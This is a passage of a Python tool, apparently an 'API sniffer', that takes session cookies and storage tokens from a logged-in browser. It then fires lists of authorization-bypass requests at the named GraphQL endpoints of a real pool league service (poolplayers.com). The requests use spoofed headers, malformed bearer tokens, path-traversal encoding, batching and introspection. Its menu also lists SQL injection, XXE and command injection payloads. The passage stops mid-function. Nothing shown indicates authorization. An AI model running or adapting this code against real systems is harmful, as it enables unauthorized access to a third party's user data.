    print("     • Security headers (CSP, X-Frame-Options, etc.)")
    print("     • API schema patterns (REST operations: GET/POST/PUT/DELETE)")
    
    print("\n  🔗 GraphQL/Direct API Testing (mode 11) captures:")
    print("     • Direct GraphQL endpoint testing with authenticated session")
    print("     • GraphQL introspection queries and schema discovery")
    print("     • Custom GraphQL queries to explore available data")
    print("     • Direct HTTP API endpoint calls with session cookies/tokens")
    print("     • API response analysis and validation")
    
    print("\n  🔓 Authorization Bypass Testing (mode 12) tests:")
    print("     • 401 Unauthorized bypass techniques")
    print("     • 403 Forbidden permission escalation")
    print("     • API access with modified/invalid tokens")
    print("     • Bypass attempts using different auth headers")
    print("     • Testing access with null/empty/dummy credentials")
    print("     • Common auth bypass techniques (header manipulation, case changes, etc.)")
    
    print("\n  🚀 Advanced GraphQL 403 Bypass Testing (mode 14) tests:")
    print("     • GraphQL-specific aliasing queries to avoid blocking/rate limits")
    print("     • Batch queries in single request for permission bypass")
    print("     • Mutations vs queries (different endpoint logic/permissions)")
    print("     • Fragment-based queries to circumvent query parsing/blocking")
    print("     • HTTP/2 specific headers and protocol tricks")
    print("     • Path traversal tricks (e.g., /graphql/..%2f encoding)")
    print("     • HTTP Method overrides (X-HTTP-Method-Override)")
    print("     • Custom content-type variations (application/json with charset)")
    print("     • Expired token with refresh attempt exploitation")
    print("     • Token from different user session bypass")
    print("     • JWT manipulation (if endpoint doesn't verify signatures)")
    print("     • OPTIONS preflight exploitation for CORS bypass")
    print("     • Subdomain bypass techniques")
    
    print("\n  🎯 PoolPlayers GQL Bypass Testing (mode 15) tests:")
    print("     • Specialized bypass techniques for https://gql.poolplayers.com/graphql/")
    print("     • Direct POST requests with authentication manipulation")
    print("     • Token validation bypass attempts")
    print("     • Permission escalation on authenticated endpoints")
    print("     • Cached response exploitation")
    print("     • Rate limit bypass techniques")
    
    print("\n  📝 Form Auto-fill Detection (mode 16) detects:")
    print("     • Auto-fillable forms and their structure")
    print("     • Form fields with autocomplete attributes")
    print("     • Password manager compatibility")
    print("     • Field types (email, password, text, tel, etc.)")
    print("     • Multi-step form detection")
    print("     • Input validation requirements")
    
    print("\n  ⚡ API Response Caching Analysis (mode 17) analyzes:")
    print("     • Cache-Control headers and directives")
    print("     • ETags and conditional request support")
    print("     • Last-Modified headers for cache validation")
    print("     • Sensitive data caching issues")
    print("     • CDN cache behavior")
    print("     • Age and Expires header analysis")
    
    print("\n  🔍 Data Leakage Detection (mode 18) scans for:")
    print("     • Email addresses in responses")
    print("     • Social Security Numbers (SSN)")
    print("     • Credit card numbers")
    print("     • Phone numbers")
    print("     • API keys and secrets")
    print("     • Database connection strings")
    print("     • Private IP addresses")
    
    print("\n  🔐 Hidden/Debug Endpoints Discovery (mode 19) probes for:")
    print("     • Debug endpoints (/__debug__, /debug, /api/debug)")
    print("     • Internal/Private endpoints (/internal, /private, /intranet)")
    print("     • API version endpoints (/api/v2, /api/v3, /api/beta)")
    print("     • Admin panels (/admin, /administrator, /staff)")
    print("     • Configuration files (/config, /.env, /settings)")
    print("     • Status/Health endpoints (/health, /status, /ping)")
    print("     • Backup/Archive endpoints (/backup, /export, /dump)")
    
    print("\n  🛡️  CORS Policy Analysis (mode 20) analyzes:")
    print("     • CORS headers (Access-Control-Allow-Origin, etc)")
    print("     • Wildcard origin (*) configurations")
    print("     • Null origin acceptance with credentials")
    print("     • Attacker origin acceptance")
    print("     • Overly permissive preflight responses")
    
    print("\n  🔑 JWT Token Analysis (mode 21) examines:")
    print("     • JWT extraction from cookies and localStorage")
    print("     • Weak signature algorithms (none, HS256)")
    print("     • Missing expiration (exp claim)")
    print("     • Key ID (kid) manipulation vectors")
    print("     • Algorithm substitution vulnerabilities")
    
    print("\n  📋 API Key Exposure Detection (mode 22) searches for:")
    print("     • AWS keys, GitHub tokens, Stripe keys")
    print("     • Google API keys, Firebase configs")
    print("     • Bearer tokens and private keys")
    print("     • Keys in cookies, localStorage, URLs")
    print("     • Leaked keys in response data")
    
    print("\n  💉 SQL Injection Testing (mode 23) tests:")
    print("     • Query parameters (id, name, search, filter)")
    print("     • SQLi payloads: ' OR '1'='1, UNION SELECT")
    print("     • DROP TABLE and SLEEP injection")
    print("     • Comment-based bypasses")
    print("     • Parameter analysis and payload generation")
    
    print("\n  🔶 XML/XXE Injection Testing (mode 24) probes:")
    print("     • XML endpoint detection (soap, api/xml)")
    print("     • XXE file disclosure payloads")
    print("     • External entity processing")
    print("     • Environment variable exfiltration")
    print("     • Form encoding analysis")
    
    print("\n  ⚡ Command Injection Testing (mode 25) examines:")
    print("     • Shell metacharacter payloads (;, |, &)")
    print("     • Backtick and $() command substitution")
    print("     • Parameter keyword analysis (cmd, exec)")
    print("     • Remote code execution (RCE) vectors")
    print("     • Injectable parameter identification")
    
    print("\n  🛡️  GraphQL Authorization Bypass Testing (mode 26) tests:")
    print("     • Type union probing (Member/ExternalStaff/NationalOfficeStaff)")
    print("     • Cross-user data access attempts")
    print("     • Schema introspection queries")
    print("     • Batch query enumeration")
    print("     • Nested query traversal")
    print("     • Mutation discovery and operation enumeration")
    print("     • Authorization boundary violations")
    print()

    choice = input("Select mode (default 1): ").strip()
    if choice not in CAPTURE_MODES:
        choice = "1"

    capture_mode = CAPTURE_MODES[choice]["key"]
    CliOutput.success(f"Capture mode: {CAPTURE_MODES[choice]['name']}")
    return CAPTURE_MODES[choice]


# ================================================================================
# GraphQL/DIRECT API TESTING FUNCTIONS
# ================================================================================

async def test_graphql_endpoints(page, context):
    """
    Test GraphQL endpoints directly with authenticated session.
    Handles authorization failures and provides diagnostic info.
    Tries multiple auth strategies to determine what's blocking access.
    """
    graphql_results = []
    
    try:
        # Extract cookies and auth tokens from the authenticated session
        cookies = await context.cookies()
        cookie_dict = {cookie['name']: cookie['value'] for cookie in cookies}
        
        # Try to extract auth tokens from page localStorage/sessionStorage
        auth_tokens = {}
        try:
            storage_data = await page.evaluate("""() => {
                const data = {};
                
                // Check localStorage for tokens
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    if (key && (key.toLowerCase().includes('token') || 
                               key.toLowerCase().includes('auth') || 
                               key.toLowerCase().includes('jwt') ||
                               key.toLowerCase().includes('bearer'))) {
                        data['localStorage_' + key] = localStorage.getItem(key);
                    }
                }
                
                // Check sessionStorage for tokens
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    if (key && (key.toLowerCase().includes('token') || 
                               key.toLowerCase().includes('auth') || 
                               key.toLowerCase().includes('jwt') ||
                               key.toLowerCase().includes('bearer'))) {
                        data['sessionStorage_' + key] = sessionStorage.getItem(key);
                    }
                }
                
                return data;
            }""")
            auth_tokens = storage_data
        except Exception as e:
            CliOutput.warn(f"Could not extract tokens from storage: {e}", indent=1)
        
        # List of GraphQL endpoints to test
        graphql_endpoints = [
            "https://gql.poolplayers.com/graphql/",
            "https://api.poolplayers.com/graphql",
            "https://league.poolplayers.com/graphql",
        ]
        
        # Standard headers
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "APA-API-Sniffer/2.0"
        }
        
        # Extract Bearer token from cookies if available
        bearer_token = None
        for cookie_name in cookie_dict:
            if 'token' in cookie_name.lower() or 'auth' in cookie_name.lower():
                bearer_token = cookie_dict[cookie_name]
                break
        
        # Also check for Authorization header in stored tokens
        for token_key, token_value in auth_tokens.items():
            if token_value and len(str(token_value)) > 10:  # Likely a real token
                bearer_token = token_value
                break
        
        # GraphQL queries to test
        queries = [
            {
                "name": "Schema Introspection (__typename)",
                "query": "query { __typename }"
            },
            {
                "name": "Full Schema Discovery",
                "query": """
                query {
                  __schema {
                    types {
                      name
                      kind
                      description
                    }
                  }
                }
                """
            },
            {
                "name": "Query Root Fields",
                "query": """
                query {
                  __schema {
                    queryType {
                      fields {
                        name
                        type { name }
                        description
                      }
                    }
                  }
                }
                """
            }
        ]
        
        for endpoint in graphql_endpoints:
            endpoint_results = {
                "endpoint": endpoint,
                "tests": [],
                "accessible": False,
                "auth_attempts": []
            }
            
            for query_test in queries:
                test_result = {
                    "name": query_test["name"],
                    "attempts": []
                }
                
                # Try multiple authentication strategies
                auth_attempts = [
                    {
                        "name": "No Auth",
                        "headers": dict(headers)
                    },
                    {
                        "name": "With Cookies Only",
                        "headers": dict(headers)
                    }
                ]
                
                # Add Bearer token attempts if available
                if bearer_token:
                    auth_attempts.extend([
                        {
                            "name": f"Bearer Token",
                            "headers": {**headers, "Authorization": f"Bearer {bearer_token}"}
                        },
                        {
                            "name": f"Direct Authorization",
                            "headers": {**headers, "Authorization": bearer_token}
                        }
                    ])
                
                # Add custom header attempts
                auth_attempts.extend([
                    {
                        "name": "X-Auth-Token Header",
                        "headers": {**headers, "X-Auth-Token": bearer_token or "test"} if bearer_token else {**headers}
                    },
                    {
                        "name": "X-API-Key Header",
                        "headers": {**headers, "X-API-Key": bearer_token or "test"} if bearer_token else {**headers}
                    }
                ])
                
                for auth_attempt in auth_attempts:
                    attempt_headers = auth_attempt["headers"]
                    
                    try:
                        response = requests.post(
                            endpoint,
                            json={"query": query_test["query"]},
                            headers=attempt_headers,
                            cookies=cookie_dict,
                            timeout=10
                        )
                        
                        attempt_result = {
                            "auth_method": auth_attempt["name"],
                            "status_code": response.status_code,
                            "success": response.status_code == 200,
                            "timestamp": datetime.now().isoformat(),
                        }
                        
                        # Analyze response
                        if response.status_code == 200:
                            try:
                                response_json = response.json()
                                if "errors" in response_json and response_json["errors"]:
                                    attempt_result["has_errors"] = True
                                    error_msg = str(response_json["errors"][0]).lower()
                                    
                                    # Detect authorization errors
                                    if any(auth_keyword in error_msg for auth_keyword in 
                                           ["unauthorized", "forbidden", "authentication", "permission", 
                                            "invalid token", "expired", "not authenticated", "unauthenticated"]):
                                        attempt_result["error_type"] = "AUTHORIZATION_FAILED"
                                        attempt_result["error_sample"] = response_json["errors"][0]
                                    else:
                                        attempt_result["error_type"] = "QUERY_ERROR"
                                        attempt_result["error_sample"] = response_json["errors"][0]
                                
                                if "data" in response_json:
                                    attempt_result["has_data"] = True
                                    if query_test["name"] == "Schema Introspection (__typename)":
                                        attempt_result["data_sample"] = response_json.get("data", {})
                                        if attempt_result.get("has_data") and not attempt_result.get("has_errors"):
                                            attempt_result["success"] = True
                                            endpoint_results["accessible"] = True
                            except Exception:
                                attempt_result["response_body"] = response.text[:500]
                        
                        elif response.status_code == 401:
                            attempt_result["error_type"] = "UNAUTHORIZED_401"
                            attempt_result["error_description"] = "Endpoint returned 401 Unauthorized - valid auth token/credentials required"
                            attempt_result["requires_auth"] = True
                        
                        elif response.status_code == 403:
                            attempt_result["error_type"] = "FORBIDDEN_403"
                            attempt_result["error_description"] = "Endpoint returned 403 Forbidden - may require specific permissions/roles"
                            attempt_result["requires_special_auth"] = True
                        
                        elif response.status_code == 405:
                            attempt_result["error_type"] = "METHOD_NOT_ALLOWED_405"
                            attempt_result["error_description"] = "Endpoint does not accept POST requests"
                        
                        elif response.status_code == 404:
                            attempt_result["error_type"] = "NOT_FOUND_404"
                            attempt_result["error_description"] = "GraphQL endpoint not found at this URL"
                        
                        elif response.status_code >= 500:
                            attempt_result["error_type"] = "SERVER_ERROR"
                            attempt_result["response_text"] = response.text[:200]
                        
                        else:
                            attempt_result["response_text"] = response.text[:200]
                        
                        test_result["attempts"].append(attempt_result)
                    
                    except requests.exceptions.Timeout:
                        test_result["attempts"].append({
                            "auth_method": auth_attempt["name"],
                            "error": "Request timeout (endpoint may be slow or unreachable)",
                            "error_type": "TIMEOUT",
                            "timestamp": datetime.now().isoformat(),
                        })
                    
                    except requests.exceptions.ConnectionError:
                        test_result["attempts"].append({
                            "auth_method": auth_attempt["name"],
                            "error": "Connection failed (endpoint may be down or blocked)",
                            "error_type": "CONNECTION_ERROR",
                            "timestamp": datetime.now().isoformat(),
                        })
                    
                    except Exception as e:
                        test_result["attempts"].append({
                            "auth_method": auth_attempt["name"],
                            "error": str(e)[:100],
                            "error_type": "EXCEPTION",
                            "timestamp": datetime.now().isoformat(),
                        })
                
                endpoint_results["tests"].append(test_result)
            
            # Diagnostic summary for this endpoint
            auth_blocked = any(
                attempt.get("error_type") in ["UNAUTHORIZED_401", "FORBIDDEN_403"] 
                for test in endpoint_results["tests"] 
                for attempt in test.get("attempts", [])
            )
            endpoint_results["auth_blocked"] = auth_blocked
            
            graphql_results.append(endpoint_results)
    
    except Exception as e:
        CliOutput.warn(f"GraphQL testing error: {e}", indent=1)
    
    return graphql_results


async def test_auth_bypass(page, context):
    """
    Test authorization bypass techniques on GraphQL endpoints.
    Attempts to bypass 401/403 errors using various methods.
    """
    bypass_results = []
    
    try:
        cookies = await context.cookies()
        cookie_dict = {cookie['name']: cookie['value'] for cookie in cookies}
        
        # Try to extract a valid bearer token from the session
        valid_bearer_token = None
        for cookie_name in cookie_dict:
            if 'token' in cookie_name.lower() or 'auth' in cookie_name.lower():
                valid_bearer_token = cookie_dict[cookie_name]
                break
        
        # List of GraphQL endpoints to test
        graphql_endpoints = [
            "https://gql.poolplayers.com/graphql/",
            "https://api.poolplayers.com/graphql",
            "https://league.poolplayers.com/graphql",
        ]
        
        base_headers = {
            "Content-Type": "application/json",
            "User-Agent": "APA-API-Sniffer/2.0"
        }
        
        # Simple GraphQL query to test access
        test_query = {"query": "query { __typename }"}
        
        # Authorization bypass techniques to attempt
        bypass_techniques = [
            {
                "name": "No Authorization",
                "headers": dict(base_headers),
                "description": "Attempt access without any auth"
            },
            {
                "name": "Empty Bearer Token",
                "headers": {**base_headers, "Authorization": "Bearer "},
                "description": "Send empty Bearer token"
            },
            {
                "name": "Invalid Bearer Token",
                "headers": {**base_headers, "Authorization": "Bearer invalid_token_12345"},
                "description": "Send obviously invalid token"
            },
            {
                "name": "Null Authorization",
                "headers": {**base_headers, "Authorization": "null"},
                "description": "Send 'null' as auth value"
            },
            {
                "name": "Case Manipulation - BEARER",
                "headers": {**base_headers, "Authorization": "BEARER test"},
                "description": "Try uppercase BEARER instead of Bearer"
            },
            {
                "name": "Case Manipulation - bearer",
                "headers": {**base_headers, "Authorization": "bearer test"},
                "description": "Try lowercase bearer"
            },
            {
                "name": "Valid Bearer Token (from session)",
                "headers": {**base_headers, "Authorization": f"Bearer {valid_bearer_token}"} if valid_bearer_token else dict(base_headers),
                "description": "Use valid authenticated session token as Bearer token"
            },
            {
                "name": "Authorization: null Header",
                "headers": {**base_headers, "Authorization": "null"},
                "description": "Authorization header set to string 'null'"
            },
            {
                "name": "Bypass with Spaces",
                "headers": {**base_headers, "Authorization": "Bearer    "},
                "description": "Send Bearer token with only spaces"
            },
            {
                "name": "Double Bearer",
                "headers": {**base_headers, "Authorization": "Bearer Bearer token"},
                "description": "Double Bearer prefix"
            },
            {
                "name": "No Space After Bearer",
                "headers": {**base_headers, "Authorization": "Bearertest"},
                "description": "Bearer without space before token"
            },
            {
                "name": "X-Auth-Token Bypass (empty)",
                "headers": {**base_headers, "X-Auth-Token": ""},
                "description": "Empty X-Auth-Token header"
            },
            {
                "name": "X-API-Key Bypass (empty)",
                "headers": {**base_headers, "X-API-Key": ""},
                "description": "Empty X-API-Key header"
            },
            {
                "name": "Accept: * (Any Content Type)",
                "headers": {**base_headers, "Accept": "*/*"},
                "description": "Try wildcard accept header"
            },
            {
                "name": "X-Forwarded-For Bypass",
                "headers": {**base_headers, "X-Forwarded-For": "127.0.0.1"},
                "description": "Try X-Forwarded-For with localhost"
            },
            {
                "name": "Referer Bypass",
                "headers": {**base_headers, "Referer": "https://league.poolplayers.com/"},
                "description": "Add internal referer"
            },
            {
                "name": "Origin Bypass",
                "headers": {**base_headers, "Origin": "https://league.poolplayers.com"},
                "description": "Set Origin to internal domain"
            },
        ]
        
        for endpoint in graphql_endpoints:
            endpoint_results = {
                "endpoint": endpoint,
                "bypass_attempts": [],
                "successful_bypasses": []
            }
            
            for technique in bypass_techniques:
                try:
                    attempt_headers = technique["headers"]
                    
                    response = requests.post(
                        endpoint,
                        json=test_query,
                        headers=attempt_headers,
                        cookies=cookie_dict,
                        timeout=10
                    )
                    
                    attempt = {
                        "technique": technique["name"],
                        "description": technique["description"],
                        "status_code": response.status_code,
                        "timestamp": datetime.now().isoformat(),
                    }
                    
                    # Check for successful bypass
                    bypass_success = False
                    
                    if response.status_code == 200:
                        try:
                            response_json = response.json()
                            if "data" in response_json and not response_json.get("errors"):
                                attempt["success"] = True
                                attempt["result"] = "SUCCESSFUL_BYPASS"
                                bypass_success = True
                            elif "data" in response_json:
                                attempt["has_partial_access"] = True
                                attempt["result"] = "PARTIAL_BYPASS"
                        except Exception:
                            attempt["response_preview"] = response.text[:200]
                    
                    elif response.status_code in [401, 403]:
                        # Check if error message changed (indicating server processed request differently)
                        try:
                            response_json = response.json()
                            if "errors" in response_json:
                                error_msg = str(response_json["errors"]).lower()
                                attempt["error_message"] = response_json["errors"][0] if response_json["errors"] else None
                                # Even if 401/403, if error is different, note it
                                attempt["still_blocked"] = True
                        except Exception:
                            pass
                        attempt["result"] = "BLOCKED"
                    
                    elif response.status_code == 200:
                        attempt["result"] = "SUCCESS"
                        bypass_success = True
                    
                    endpoint_results["bypass_attempts"].append(attempt)
                    
                    if bypass_success:
                        endpoint_results["successful_bypasses"].append({
                            "technique": technique["name"],
                            "status_code": response.status_code
                        })
                
                except requests.exceptions.Timeout:
                    endpoint_results["bypass_attempts"].append({
                        "technique": technique["name"],
                        "error": "Timeout",
                        "error_type": "TIMEOUT",
                        "timestamp": datetime.now().isoformat(),
                    })
                
                except Exception as e:
                    endpoint_results["bypass_attempts"].append({
                        "technique": technique["name"],
                        "error": str(e)[:100],
                        "error_type": "EXCEPTION",
                        "timestamp": datetime.now().isoformat(),
                    })
            
            # Summary
            endpoint_results["total_attempts"] = len(endpoint_results["bypass_attempts"])
            endpoint_results["successful_count"] = len(endpoint_results["successful_bypasses"])
            endpoint_results["vulnerable_to_bypass"] = len(endpoint_results["successful_bypasses"]) > 0
            
            bypass_results.append(endpoint_results)
    
    except Exception as e:
        CliOutput.warn(f"Auth bypass testing error: {e}", indent=1)
    
    return bypass_results


async def test_advanced_graphql_bypass(page, context):
    """
    Test advanced GraphQL-specific 403 bypass techniques.
    Attempts to bypass 403 Forbidden errors using GraphQL-specific methods.
    """
    bypass_results = []
    
    try:
        cookies = await context.cookies()
        cookie_dict = {cookie['name']: cookie['value'] for cookie in cookies}
        
        # Try to extract a valid bearer token from the session
        valid_bearer_token = None
        for cookie_name in cookie_dict:
            if 'token' in cookie_name.lower() or 'auth' in cookie_name.lower():
                valid_bearer_token = cookie_dict[cookie_name]
                break
        
        # List of GraphQL endpoints to test
        graphql_endpoints = [
            "https://gql.poolplayers.com/graphql/",
            "https://api.poolplayers.com/graphql",
            "https://league.poolplayers.com/graphql",
        ]
        
        base_headers = {
            "Content-Type": "application/json",
            "User-Agent": "APA-API-Sniffer/2.0"
        }
        
        # Advanced GraphQL-specific bypass techniques
        bypass_techniques = [
            {
                "name": "Query Aliasing",
                "payload": {"query": "query Q1 { data: __typename } query Q2 { __typename }"},
                "description": "Use GraphQL query aliases to avoid blocking"
            },
            {
                "name": "Batch Multiple Queries",
                "payload": [
                    {"query": "query { __typename }"},
                    {"query": "query { __typename }"},
                    {"query": "query { __typename }"}
                ],
                "description": "Send multiple queries in single request"
            },
            {
                "name": "Mutation Instead of Query",
                "payload": {"query": "mutation { __typename }"},
                "description": "Use mutation instead of query for same endpoint"
            },
            {
                "name": "Fragment-Based Query",
                "payload": {"query": "fragment T on Query { __typename } query { ...T }"},
                "description": "Use fragments to circumvent query parsing/blocking"
            },
            {
                "name": "Nested Fragment Query",
                "payload": {"query": "fragment F on __Type { name kind } query { __schema { types { ...F } } }"},
                "description": "Deeply nested fragments to bypass content filtering"
            },
            {
                "name": "Path Traversal Encoding",
                "payload": {"query": "query { __typename }"},
                "description": "Use encoded path like /graphql/..%2f or /api/graphql%00",
                "use_traversal_url": True
            },
            {
                "name": "Content-Type application/json; charset=utf-8",
                "payload": {"query": "query { __typename }"},
                "headers_override": {**base_headers, "Content-Type": "application/json; charset=utf-8"},
                "description": "Add charset to Content-Type header"
            },
            {
                "name": "X-HTTP-Method-Override POST",
                "payload": {"query": "query { __typename }"},
                "headers_override": {**base_headers, "X-HTTP-Method-Override": "POST"},
                "description": "Use method override header"
            },
            {
                "name": "OPTIONS Preflight Bypass",
                "payload": {"query": "query { __typename }"},
                "description": "Exploit CORS preflight handling",
                "use_options_method": True
            },
            {
                "name": "Accept Encoding Bypass",
                "payload": {"query": "query { __typename }"},
                "headers_override": {**base_headers, "Accept-Encoding": "gzip, deflate, br"},
                "description": "Add compression hints to bypass"
            },
            {
                "name": "Custom X-Forwarded Headers",
                "payload": {"query": "query { __typename }"},
                "headers_override": {**base_headers, "X-Forwarded-For": "127.0.0.1", "X-Forwarded-Proto": "https", "X-Forwarded-Host": "internal.poolplayers.com"},
                "description": "Spoof internal forwarding headers"
            },
            {
                "name": "Query with Directives Skip",
                "payload": {"query": "query { __typename @skip(if: false) }"},
                "description": "Use GraphQL directives to bypass filters"
            },
            {
                "name": "Introspection with Aliases",
                "payload": {"query": "query { schema: __schema { types { name } } }"},
                "description": "Alias __schema query to bypass introspection blocks"
            },
        ]
        
        for endpoint in graphql_endpoints:
            endpoint_results = {
                "endpoint": endpoint,
                "bypass_attempts": [],
                "successful_bypasses": []
            }
            
            for technique in bypass_techniques:
                try:
                    attempt_headers = technique.get("headers_override", base_headers)
                    
                    # Handle different request types
                    if technique.get("use_options_method"):
                        # Try OPTIONS method first
                        response = requests.options(
                            endpoint,
                            headers=attempt_headers,
                            cookies=cookie_dict,
                            timeout=10
                        )
                    elif technique.get("use_traversal_url"):
                        # Try path traversal variations
                        traversal_url = endpoint.replace("/graphql/", "/graphql/..%2f").replace("/graphql", "/graphql%00")
                        if isinstance(technique.get("payload"), list):
                            response = requests.post(
                                traversal_url,
                                json=technique["payload"][0],
                                headers=attempt_headers,
                                cookies=cookie_dict,
                                timeout=10
                            )
                        else:
                            response = requests.post(
                                traversal_url,
                                json=technique["payload"],
                                headers=attempt_headers,
                                cookies=cookie_dict,
                                timeout=10
                            )
                    else:
                        # Standard POST request
                        if isinstance(technique["payload"], list):
                            # Send batch queries
                            response = requests.post(
                                endpoint,
                                json=technique["payload"],
                                headers=attempt_headers,
                                cookies=cookie_dict,
                                timeout=10
                            )
                        else:
                            response = requests.post(
                                endpoint,
                                json=technique["payload"],
                                headers=attempt_headers,
                                cookies=cookie_dict,
                                timeout=10
                            )
                    
                    attempt = {
                        "technique": technique["name"],
                        "description": technique["description"],
                        "status_code": response.status_code,
                        "timestamp": datetime.now().isoformat(),
                    }
                    
                    # Check for successful bypass
                    bypass_success = False
                    
                    if response.status_code == 200:
                        try:
                            response_json = response.json()
                            # Handle batch responses
                            if isinstance(response_json, list):
                                # Check if any in batch succeeded
                                if any("data" in item and not item.get("errors") for item in response_json):
                                    attempt["success"] = True
                                    attempt["result"] = "SUCCESSFUL_BYPASS"
                                    bypass_success = True
                            elif "data" in response_json and not response_json.get("errors"):
                                attempt["success"] = True
                                attempt["result"] = "SUCCESSFUL_BYPASS"
                                bypass_success = True
                            elif "data" in response_json:
                                attempt["has_partial_access"] = True
                                attempt["result"] = "PARTIAL_BYPASS"
                        except Exception:
                            attempt["response_preview"] = response.text[:200]
                    
                    elif response.status_code == 403:
                        # 403 still returned - technique didn't bypass
                        try:
                            response_json = response.json()
                            if "errors" in response_json:
                                attempt["error_message"] = str(response_json["errors"][0]) if response_json["errors"] else None
                        except Exception:
                            pass
                        attempt["result"] = "BLOCKED_403"
                    
                    elif response.status_code == 401:
                        attempt["result"] = "BLOCKED_401"
                    
                    endpoint_results["bypass_attempts"].append(attempt)
                    
                    if bypass_success:
                        endpoint_results["successful_bypasses"].append({
                            "technique": technique["name"],
                            "status_code": response.status_code
                        })
                
                except requests.exceptions.Timeout:
                    endpoint_results["bypass_attempts"].append({
                        "technique": technique["name"],
                        "error": "Timeout",
                        "error_type": "TIMEOUT",
                        "timestamp": datetime.now().isoformat(),
                    })
                
                except Exception as e:
                    endpoint_results["bypass_attempts"].append({
                        "technique": technique["name"],
                        "error": str(e)[:100],
                        "error_type": "EXCEPTION",
                        "timestamp": datetime.now().isoformat(),
                    })
            
            # Summary
            endpoint_results["total_attempts"] = len(endpoint_results["bypass_attempts"])
            endpoint_results["successful_count"] = len(endpoint_results["successful_bypasses"])
            endpoint_results["vulnerable_to_advanced_bypass"] = len(endpoint_results["successful_bypasses"]) > 0
            
            bypass_results.append(endpoint_results)
    
    except Exception as e:
        CliOutput.warn(f"Advanced GraphQL bypass testing error: {e}", indent=1)
    
    return bypass_results


async def test_gql_poolplayers_bypass(page, context):
    """
    Specialized bypass testing for PoolPlayers GraphQL endpoint.
    Tests specific techniques against: https://gql.poolplayers.com/graphql/
    """
    bypass_results = {
        "endpoint": "https://gql.poolplayers.com/graphql/",
        "bypass_attempts": [],
        "successful_bypasses": [],
        "vulnerable": False
    }
    
    try:
        cookies = await context.cookies()
        cookie_dict = {cookie['name']: cookie['value'] for cookie in cookies}
        
        # Extract valid bearer token from session
        valid_bearer_token = None
        for cookie_name in cookie_dict:
            if 'token' in cookie_name.lower() or 'auth' in cookie_name.lower():
                valid_bearer_token = cookie_dict[cookie_name]
                break
        
        base_headers = {
            "Content-Type": "application/json",
            "User-Agent": "APA-API-Sniffer/2.0"
        }
        
        # Simple query for testing
        test_query = {"query": "query { __typename }"}
        
        # PoolPlayers-specific bypass techniques
        bypass_techniques = [
            {
                "name": "Direct Query - No Auth",
                "headers": dict(base_headers),
                "payload": test_query,
                "description": "Simple query without authentication"
            },
            {
                "name": "Valid Bearer Token",
                "headers": {**base_headers, "Authorization": f"Bearer {valid_bearer_token}"} if valid_bearer_token else dict(base_headers),
                "payload": test_query,
                "description": "Query with valid session bearer token"
            },
            {
                "name": "POST with Cookies Only",
                "headers": dict(base_headers),
                "payload": test_query,
                "use_cookies": True,
                "description": "Query using session cookies only"
            },
            {
                "name": "Cache Bypass - Cache-Control",
                "headers": {**base_headers, "Cache-Control": "no-cache, no-store"},
                "payload": test_query,
                "description": "Bypass caching mechanisms"
            },
            {
                "name": "Rate Limit Bypass - X-Forwarded-For",
                "headers": {**base_headers, "X-Forwarded-For": "127.0.0.1"},
                "payload": test_query,
                "description": "Spoof client IP for rate limit bypass"
            },
            {
                "name": "Multiple Query Batch",
                "payload": [test_query, test_query, test_query],
                "headers": dict(base_headers),
                "description": "Send multiple queries in single request"
            },
            {
                "name": "GraphQL Introspection",
                "payload": {
                    "query": """
                    query {
                      __schema {
                        types {
                          name
                          kind
                        }
                      }
                    }
                    """
                },
                "headers": dict(base_headers),
                "description": "Discover full GraphQL schema"
            },
            {
                "name": "Mutation Alternative",
                "payload": {"query": "mutation { __typename }"},
                "headers": dict(base_headers),
                "description": "Use mutation instead of query"
            },
            {
                "name": "Fragment-Based Query",
                "payload": {
                    "query": "fragment T on Query { __typename } query { ...T }"
                },
                "headers": dict(base_headers),
                "description": "Use fragments to bypass filters"
            },
            {
                "name": "Accept-Encoding Bypass",
                "headers": {**base_headers, "Accept-Encoding": "gzip, deflate, br"},
                "payload": test_query,
                "description": "Add compression hints"
            },
            {
                "name": "Custom User-Agent",
                "headers": {**base_headers, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
                "payload": test_query,
                "description": "Spoof browser user agent"
            },
            {
                "name": "Origin Spoofing",
                "headers": {**base_headers, "Origin": "https://league.poolplayers.com"},
                "payload": test_query,
                "description": "Spoof internal origin"
            }
        ]
        
        for technique in bypass_techniques:
            try:
                attempt_headers = technique.get("headers", base_headers)
                payload = technique.get("payload", test_query)
                
                # Handle batch queries
                if isinstance(payload, list):
                    response = requests.post(
                        "https://gql.poolplayers.com/graphql/",
                        json=payload,
                        headers=attempt_headers,
                        cookies=cookie_dict if technique.get("use_cookies") else None,
                        timeout=10
                    )
                else:
                    response = requests.post(
                        "https://gql.poolplayers.com/graphql/",
                        json=payload,
                        headers=attempt_headers,
                        cookies=cookie_dict if technique.get("use_cookies") else None,
                        timeout=10
                    )
                
                attempt = {
                    "technique": technique["name"],
                    "description": technique["description"],
                    "status_code": response.status_code,
                    "timestamp": datetime.now().isoformat(),
                }
                
                # Check for successful bypass
                bypass_success = False
                
                if response.status_code == 200:
                    try:
                        response_json = response.json()
                        if "data" in response_json and not response_json.get("errors"):
                            attempt["success"] = True
                            attempt["result"] = "SUCCESSFUL_BYPASS"
                            bypass_success = True
                        elif "data" in response_json:
                            attempt["has_data"] = True
                            attempt["result"] = "PARTIAL_ACCESS"
                    except Exception:
                        attempt["response_preview"] = response.text[:300]
                        attempt["result"] = "HTTP_200_RESPONSE"
                        bypass_success = True
                
                elif response.status_code in [401, 403]:
                    attempt["result"] = "BLOCKED"
                    attempt["blocked_reason"] = f"HTTP {response.status_code}"
                
                else:
                    attempt["result"] = f"HTTP_{response.status_code}"
                
                bypass_results["bypass_attempts"].append(attempt)
                
                if bypass_success:
                    bypass_results["successful_bypasses"].append({
                        "technique": technique["name"],
                        "status_code": response.status_code
                    })
            
            except requests.exceptions.Timeout:
                bypass_results["bypass_attempts"].append({
                    "technique": technique["name"],
                    "error": "Timeout",
                    "error_type": "TIMEOUT",
                    "timestamp": datetime.now().isoformat(),
                })
            
            except Exception as e:
                bypass_results["bypass_attempts"].append({
                    "technique": technique["name"],
                    "error": str(e)[:100],
                    "error_type": "EXCEPTION",
                    "timestamp": datetime.now().isoformat(),
                })
        
        # Summary
        bypass_results["total_attempts"] = len(bypass_results["bypass_attempts"])
        bypass_results["successful_count"] = len(bypass_results["successful_bypasses"])
        bypass_results["vulnerable"] = len(bypass_results["successful_bypasses"]) > 0
        
    except Exception as e:
